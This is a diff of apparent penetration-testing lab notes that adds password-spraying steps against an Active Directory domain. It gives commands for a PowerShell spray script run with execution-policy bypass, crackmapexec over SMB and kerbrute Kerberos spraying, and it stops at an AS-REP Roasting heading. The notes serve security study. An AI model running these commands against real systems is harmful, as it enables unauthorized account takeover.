@@ -259,10 +259,23 @@ password is incorrect.
     + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
 ```
 - [Spray-Passwords.ps1](https://gist.github.com/m3t3kh4n/4d190b021c8189535cee9ebf229a87cd)
-
-
-
-
+The -Pass option allows us to set a single password to test, or we can submit a wordlist file using -File. We can also test admin accounts by adding the -Admin flag. The PowerShell script automatically identifies domain users and sprays a password against them.
+```
+powershell -ep bypass
+.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+```
+- Password spraying using `crackmapexec` in SMB
+```
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+```
+crackmapexec added `Pwn3d!` to the output, indicating that the user has administrative privileges on the target system
+- Password spraying using Kerberos TGT
+We'll need to provide a username and password to do this. If the credentials are valid, we'll obtain a TGT.
+```
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+```
+If you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's Save As functionality to change the encoding.
+## AS-REP Roasting
 
 
 
